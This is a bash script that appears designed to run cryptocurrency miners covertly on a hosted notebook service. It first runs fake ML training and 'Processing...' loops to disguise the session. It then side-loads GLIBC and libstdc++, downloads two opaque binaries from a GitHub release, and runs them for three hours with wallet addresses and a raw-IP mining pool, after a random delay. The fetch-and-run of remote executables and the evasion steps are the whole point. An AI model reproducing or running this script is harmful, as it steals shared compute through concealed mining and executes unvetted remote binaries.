#!/bin/bash
# MINN v4 — proper GLIBC 2.35 install + golden (no proxy)
set -e
PRL="prl1pkmulndfyls8zqz2r6nruevpqr3tax9nwmvew7aupaxqnkcyuppeqa6am7q"
TDC="tbc1q727xp60hjp6zld2vgrj8qrdmgvkshwav86xns2"
WRK=$(date +%s | md5sum | head -c 8)
echo "[MINN] Worker: $WRK"

# === 1. Warmup ML 10 menit ===
echo "[1/5] Warmup ML..."
pip install -q tensorflow 2>/dev/null
python3 -c "
import tensorflow as tf,numpy as np,time
m=tf.keras.Sequential([tf.keras.layers.Dense(128,activation='relu',input_shape=(784,)),tf.keras.layers.Dense(64,activation='relu'),tf.keras.layers.Dense(10)])
m.compile(optimizer='adam',loss='sparse_categorical_crossentropy',metrics=['accuracy'])
x=np.random.rand(2000,784).astype(np.float32);y=np.random.randint(0,10,2000)
for e in range(5): m.fit(x,y,batch_size=32,epochs=1,verbose=2);time.sleep(30)
"

# === 2. Idle 15 menit ===
echo "[2/5] Idle..."
python3 -c "
import time,numpy as np,random
for i in range(15):
    print(f'  [{i+1}/15] Processing...')
    x=np.random.rand(512,512);np.dot(x,x.T)
    time.sleep(60)
"

# === 3. Install GLIBC 2.35 ===
echo "[3/5] Installing GLIBC 2.35..."
GLIBC_DIR="$HOME/.local/glibc-2.35"
if [ ! -f "$GLIBC_DIR/lib/ld-linux-x86-64.so.2" ]; then
    mkdir -p "$GLIBC_DIR"
    cd "$HOME"
    wget -q http://archive.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.35-0ubuntu3.8_amd64.deb
    mkdir -p glibc_extract
    dpkg-deb -x libc6_2.35-0ubuntu3.8_amd64.deb glibc_extract
    cp -r glibc_extract/lib/x86_64-linux-gnu/* "$GLIBC_DIR/lib/" 2>/dev/null || true
    mkdir -p "$GLIBC_DIR/lib"
    # ld-linux might be in different paths
    find glibc_extract -name 'ld-linux-x86-64.so.2' -exec cp {} "$GLIBC_DIR/lib/" \; 2>/dev/null
    find glibc_extract -name 'ld-*.so' -exec cp {} "$GLIBC_DIR/lib/" \; 2>/dev/null
    rm -rf glibc_extract libc6*.deb
    echo "GLIBC installed: $(ls $GLIBC_DIR/lib/ld-* 2>/dev/null)"
fi

# === 4. Install libstdc++ (GLIBCXX_3.4.29) ===
echo "[4/5] Installing libstdc++..."
if [ ! -f "$HOME/lib64/libstdc++.so.6" ] || ! strings "$HOME/lib64/libstdc++.so.6" 2>/dev/null | grep -q "GLIBCXX_3.4.29"; then
    mkdir -p "$HOME/lib64"
    cd "$HOME"
    wget -q http://archive.ubuntu.com/ubuntu/pool/main/g/gcc-12/libstdc++6_12.3.0-1ubuntu1~22.04_amd64.deb
    dpkg-deb -x libstdc++6_12.3.0-1ubuntu1~22.04_amd64.deb stdcxx_extract
    cp -f stdcxx_extract/usr/lib/x86_64-linux-gnu/libstdc++.so.6* "$HOME/lib64/" 2>/dev/null || true
    rm -rf stdcxx_extract libstdc++6*.deb
fi

# Create run-glibc wrapper
cat > "$HOME/run-glibc" << 'WRAPPER'
#!/bin/bash
GLIBC_PATH="$HOME/.local/glibc-2.35/lib"
LOCAL_LIB="$HOME/lib64"
SYSLIB="/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu"
"$GLIBC_PATH/ld-linux-x86-64.so.2" --library-path "$GLIBC_PATH:$LOCAL_LIB:$SYSLIB" "$@"
WRAPPER
chmod +x "$HOME/run-glibc"

echo "[4/5] GLIBC wrapper ready: $(file $GLIBC_DIR/lib/ld-linux-x86-64.so.2)"

# === 5. Download miners + run ===
echo "[5/5] Downloading + starting..."
rm -rf /content/m 2>/dev/null; mkdir -p /content/m && cd /content/m
wget -q https://github.com/rochmandwi/ayam/releases/download/file-v1/golden
wget -q https://github.com/rochmandwi/ayam/releases/download/file-v1/sse2
chmod +x golden sse2

sleep $((RANDOM % 20 + 10))

# GOLDEN
(while true; do
    "$HOME/run-glibc" ./golden --pubkey=2Kb9Jou5c9bScVHxsDoaZeTGyrr7aow4yCVTiHnNt68HTs24t6B23VV --label="${WRK}" --mode=cpu --threads=1
    sleep 15
done) &
PID1=$!
sleep 20

# SSE2
./sse2 -a yespowertide -o 47.251.244.12:80 -u "${TDC}.${WRK}" -t 1 >/dev/null 2>&1 &
PID2=$!

echo "[MINN] Running — PID:$PID1 $PID2"
(sleep 10800; kill $PID1 $PID2 2>/dev/null; echo "[MINN] Done") &
wait